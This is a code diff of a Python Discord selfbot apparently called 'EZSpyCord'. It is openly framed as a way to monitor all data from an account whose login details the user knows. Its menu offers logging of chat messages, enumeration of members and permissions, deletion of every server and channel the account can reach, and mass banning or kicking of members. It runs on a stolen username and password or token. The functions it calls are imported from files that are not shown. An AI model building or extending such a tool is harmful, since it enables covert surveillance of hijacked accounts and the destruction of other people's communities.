@@ -1,118 +1,14 @@
 import os
 import random
+import discord
+import asyncio
+from aioconsole import ainput
 
+from EZSpyCordInfoFunctions import *
+from EZSpyCordSocialFunctions import *
+from EZSpyCordPayloadFunctions import *
 
-#Defined Functions
-def MainMenu(login):
-    try:
-        global choice
-        choice=int(input("Main Menu:\n\n"
-                         "1 : Information Gathering tools\n"
-                         "2 : Social Engineering chat tools\n"
-                         "3 : Payload tools\n"
-                         "4 : User modifications\n"
-                         "99 : Quit\n"))
-        if choice == 1:
-            InfoMenu(login)
-        if choice == 2:
-            SocialMenu(login)
-        if choice == 3:
-            PayloadMenu(login)
-        if choice == 4:
-            NullMenu(login)
-        if choice == 99:
-            quit()
-    except:
-        MainMenu(login)
-
-
-def InfoMenu(login):
-    try:
-        global choice
-        choice=int(input("Information Gathering Menu:\n\n"
-                         "1 : List all members from a server(REQ:Server ID)\n"
-                         "2 : List all server names and IDs\n"
-                         "3 : List all pictures in server(REQ:Server ID)\n"
-                         "4 : List all roles and permissions of a user in server(REQ:Server & User ID)\n"
-                         "5 : List all channels and their type in a server(REQ:Server ID)\n"
-                         "6 : Get all Emoji URLs(REQ:Server ID)\n"
-                         "89 : Back\n"
-                         "99 : Quit\n"))
-        choice += 100
-        if choice == int(199):
-            quit()
-        if choice == int(189):
-            MainMenu(login)
-        else:
-            try:
-                login(choice)
-            except:
-                quit()
-    except:
-        quit()
-
-#For doing Social Engineering
-
-def SocialMenu(login):
-    try:
-        global choice
-        choice = int(input("Options Menu:\n\n"
-                         "1 : List all pictures in server(REQ:Server ID)\n"
-                         "2 : Get all Emoji URLs(REQ:Server ID)\n"
-                         "3 : Private Message a person(REQ:User ID)\n"
-                         "4 : Channel Chat(REQ:Server ID)\n"
-                         "89 : Back\n"
-                         "99 : Quit\n"))
-        choice+=200
-        if choice == int(299):
-            quit()
-        if choice == int(289):
-            MainMenu(login)
-        else:
-            try:
-                login(choice)
-            except:
-                quit()
-    except:
-        quit()
-        
-#For running any payloads
-        
-def PayloadMenu(login):
-    try:
-        global choice
-        choice = int(input("Options Menu:\n\n"
-                         "89 : Back\n"
-                         "99 : Quit\n"))
-        choice += 300
-        if choice == 389:
-            MainMenu(login)
-        if choice == 399:
-            MainMenu(login)
-        else:
-            quit()
-    except:
-        quit()
-        
-#For user modifications/User payloads
-        
-def NullMenu(login):
-    try:
-        global choice
-        choice=int(input("Options Menu:\n\n"
-                         "89 : Back\n"
-                         "99 : Quit\n"))
-        choice += 400
-        if choice == 489:
-            MainMenu(login)
-        if choice == 499:
-            quit()
-        else:
-            quit()
-    except:
-        quit()
-
-def StartScreen(login):
+def StartScreen():
     logo=(" _____ ______ _____             _____               _   _  _   \n"
           "|  ___|___  //  ___|           /  __ \             | |_| || |_ \n"
           "| |__    / / \ `--. _ __  _   _| /  \/ ___  _ __ __| |_  __  _|\n"
@@ -148,4 +44,101 @@ def StartScreen(login):
           "[+] Chat using a CLI interface on that account.\n"
           "THIS IS LICENSED UNDER THE MIT LICENSE - I AM NOT LIABLE FOR ANY DAMAGE CAUSED I JUST LIKE DOUGHNUTS thanks for listening to my psa\n\n"
           "This makes this script effective if you know the login details of an account and want to monitor all data from their account\n\n")
-    MainMenu(login)
+    MainMenu()
+
+#Defined Functions
+def MainMenu():
+    try:
+        choice=int(input("Main Menu:\n\n"
+                         "101 : List all users in a server\n"
+                         "102 : Lists all servers user connected to\n"
+                         "103 : Lists user's permissions in server\n"
+                         "104 : List server channels\n"
+                         "201 : List server channels\n"
+                         "202 : List emojis in a server\n"
+                         "203 : Log chat messages in a specific server\n"
+                         "204 : Log chat messages in a set of servers from a text file\n"
+                         "205 : Log all chat messages into a single text file\n"
+                         "301 : Remove all channels from a specific server\n"
+                         "302 : Deletes a specific server\n"
+                         "303 : Deletes all servers the user can\n"
+                         "304 : Deletes all channels the user can\n"
+                         "305 : Bans all members from a specified server\n"
+                         "306 : Kicks all members from a specified server\n"
+                         "307 : Bans all users the user can\n"
+                         "308 : Kicks all users the user can\n"
+                         "99 : Quit\n"))
+        botOrNot=str(input("Is it a bot account(y/n)")).lower()
+        client = discord.Client()
+
+        username,password,token,bot="","","",False
+        if botOrNot=="n":
+          bot=False
+          tokenOrNot=str(input("Use a token(y/n)")).lower()
+          if tokenOrNot=="n":
+            username=str(input("Enter a username"))
+            password=str(input("Enter a password"))
+          else:
+            token=str(input("Enter token"))
+        else:
+          bot=True
+          token=str(input("Enter bot token"))
+        selfBot=running(client,username,password,token,bot,choice)
+        selfBot.running()
+    except:
+        MainMenu()
+
+class running:
+
+    
+    def __init__(self,client,username,password,token,bot,choice):
+        self.server=""
+        self.client=client
+        self.username=username
+        self.password=password
+        self.choice=choice
+        self.token=token
+        self.bot=bot
+
+
+    #Run the choice and the selfbot
+    def running(self):
+        client=self.client
+        choice=self.choice
+        @client.event
+        async def on_ready():
+            print ("Client Username: "+str(client.user.name)+
+                   "\nClient ID: ", str(client.user.id)+
+                   "\n---------")
+            
+            """         All choice runnings             """
+            if   choice == 101: await choice101(client) #Lists all Members connected to a server
+            elif choice == 102: await choice102(client) #Lists all servers user is connected to
+            elif choice == 103: await choice103(client) #Lists all permissions of the user in server
+            elif choice == 104: await choice104(client) #Lists all channels and their type in server
+            elif choice == 201: await choice201(client) #Lists all URLs of profile picture images of users connected to server
+            elif choice == 202: await choice202(client) #Get all emojis on a server
+            elif choice == 203: self.server = await choice203(client) #Initialise chat logging
+            elif choice == 204: self.server = await choice204(client) #Initialise chat logging
+            elif choice == 301: await choice301(client) #Get all emojis on a server
+            elif choice == 302: await choice302(client) #Get all emojis on a server
+            elif choice == 303: await choice303(client) #Get all emojis on a server
+            elif choice == 304: await choice304(client) #Get all emojis on a server
+            elif choice == 305: await choice305(client) #Get all emojis on a server
+            elif choice == 306: await choice306(client) #Get all emojis on a server
+            elif choice == 307: await choice307(client) #Get all emojis on a server
+            elif choice == 308: await choice308(client) #Get all emojis on a server
+        @client.event
+        async def on_message(message):
+          if   choice == 203: await choice203message(self.client,message,self.server)
+          elif choice == 204: await choice204message(self.client,message,self.server)
+          elif choice == 205: await choice205(self.client,message,self.server)
+
+
+        #Running
+        try:
+          client.run(self.username, self.password)#If logging in via username/password
+        except:
+          client.run(self.token, bot=self.bot)#If logging in via token
+
+StartScreen()
